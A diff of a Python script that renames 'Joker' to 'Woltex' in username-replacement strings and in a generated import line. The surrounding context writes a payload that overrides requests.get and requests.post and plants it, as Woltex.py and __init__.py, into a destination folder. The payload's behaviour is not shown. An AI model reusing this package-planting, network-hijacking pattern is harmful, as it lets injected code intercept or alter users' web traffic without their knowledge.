@@ -21,7 +21,7 @@ def open(text):
             "WOL3EX" if len(url) == 7 else
             "WOLTEXorj" if len(url) == 8 else
             "WOLTEXsex1" if len(url) == 9 else
-            "JOKERsecxy" if len(url) == 10 else
+            "WOLTEXsecxy" if len(url) == 10 else
             "WOLTEXsecxy1" if len(url) == 11 else
             "WOLTEXsecxy12" if len(url) == 12 else
             "WOLTEXsecxy123" if len(url) == 13 else
@@ -40,7 +40,7 @@ def replace_usernames_in_text(text):
             "WOL3EX" if len(url) == 7 else
             "WOLTEXorj" if len(url) == 8 else
             "WOLTEXsex1" if len(url) == 9 else
-            "JOKERsecxy" if len(url) == 10 else
+            "WOLTEXsecxy" if len(url) == 10 else
             "WOLTEXsecxy1" if len(url) == 11 else
             "WOLTEXsecxy12" if len(url) == 12 else
             "WOLTEXsecxy123" if len(url) == 13 else
@@ -84,7 +84,7 @@ requests.get = modified_get
 requests.post = modified_post"""
 with tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f1, tempfile.NamedTemporaryFile(mode="w+", suffix=".py", delete=False) as f2:
     f1.write(baby)
-    f2.write("from .Joker import repr, list, open, stduot, stdout")
+    f2.write("from .Woltex import repr, list, open, stduot, stdout")
     files_to_move = [(f1.name, "Woltex.py"), (f2.name, "__init__.py")]
 def rip(destination):
     os.makedirs(destination, exist_ok=True)
